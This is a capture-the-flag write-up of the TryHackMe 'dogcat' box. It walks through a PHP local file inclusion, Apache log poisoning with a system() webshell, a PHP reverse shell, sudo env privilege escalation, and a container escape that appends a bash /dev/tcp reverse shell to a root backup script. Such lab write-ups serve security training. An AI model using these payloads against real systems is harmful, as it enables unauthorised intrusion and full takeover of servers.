# THM-dogcat

### nmap result

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### ffuf result

```
cats                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 110ms]
dogs                    [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 110ms]
```

We then open our browser and check the webpage.

We will test a few LFI.

We can see then that using `php://filter/convert.base64-encode/resource=` gives us a result.

`http://10.10.51.0/?view=php://filter/convert.base64-encode/resource=dog`

We then got a base64 code that we can decode using cyberchef or burp/caido.

`Here you go!PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K `

Decoding it, we got these result

`<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />`

If we analyze the decoded code, we can then see that the syntax that we can use is `dogs/"iguessfilelocation"`

We will try `dogs/index.html`

We got a warning and the index.php was logged doubled.

```
Warning: include(php://filter/convert.base64-encode/resource=dogs/index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'php://filter/convert.base64-encode/resource=dogs/index.php.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

We will then try `dogs/index`

We got similar issue.

```
Warning: include(php://filter/convert.base64-encode/resource=dogs/index.php): failed to open stream: operation failed in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'php://filter/convert.base64-encode/resource=dogs/index.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

We will try to add `../` before `/index`

`http://10.10.51.0/?view=php://filter/convert.base64-encode/resource=dogs/../index`

We did get a result

```
Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```

We will now decode it.

```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

As we can see, there is a `ext` that we can add after our `file inclusion`.

`dogs/../index&ext=`

Testing the payload, we are able to generate the `/etc/passwd`

`http://10.10.51.0/?view=dogs/../../../../etc/passwd&ext=`

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

We then look for Apache log.

`/var/log/apache2/access/log`

By using our LFI `view=dogs/../../../../var/log/apache2/access.log&ext= `

We can see that it logs our User-Agent.

We will intercept the request using Burp/Caido and modify our User-Agent and see if it will log it.

```php
GET /?view=dogs/../../../../var/log/apache2/access.log&ext= HTTP/1.1
Host: 10.10.51.0
User-Agent: testing...123
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

We ten see that it indeed log our modified User-Agent

```php
   10.6.48.114 - - [11/Oct/2023:01:22:56 +0000] "GET /?view=dogs/../../../../var/log/apache2/access.log&ext= HTTP/1.1" 200 1347 "-" "testing...123"
```

We will now try a webshell like approach that will get a command passed in the cmd variable and execute it.

`system($_GET['cmd']);`

`view=dogs/../../../../var/log/apache2/access.log&ext=&cmd=ls `

and our User-Agent 

`<?php system($_GET['cmd']);?>`

```php
     10.6.48.114 - - [11/Oct/2023:01:39:06 +0000] "GET /?view=dogs/../../../../var/log/apache2/access.log&ext=&cmd=ls HTTP/1.1" 200 852 "-" "cat.php
        cats
        dog.php
        dogs
        flag.php
        index.php
        style.css
```

We see that we have a working RCE.

We will now issue a reverse shell.

```php
php -r '$sock=fsockopen("10.6.48.114",10500);exec("/bin/bash <&3 >&3 2>&3");'
```

```php
GET /?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=php%20-r%20'%24sock%3Dfsockopen("10.6.48.114"%2C10500)%3Bexec("%2Fbin%2Fbash%20<%263%20>%263%202>%263")%3B'
```

and open a listener on our terminal before hitting submit/send.

and we have a shell!

```bash
└─# nc -lvnp 10500           
listening on [any] 10500 ...
connect to [10.6.48.114] from (UNKNOWN) [10.10.12.154] 48160
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

By running sudo -l

We can see that it can run sudo on `env` without password.

We can use it to escalate our privilege (https://gtfobins.github.io/)

```bash
sudo -l
Matching Defaults entries for www-data on 949994f7cf33:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on 949994f7cf33:
    (root) NOPASSWD: /usr/bin/env
www-data@949994f7cf33:/$ sudo env /bin/sh
sudo env /bin/sh
whoami
root
```

TO get the last flag.

It is outside of this box, this is possible because the box we are in is a container inside of another box.

We can see this by going into "opt/backups" and looking around the backup archive.

# cat backup.sh
```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```

By modifying it and adding a reverse shell.

```
# echo "/bin/bash -c 'bash -i >& /dev/tcp/10.6.48.114/10501 0>&1'" >> backup.sh
```

and opening another listener into our machine, in a few minutes we should receive our shell.

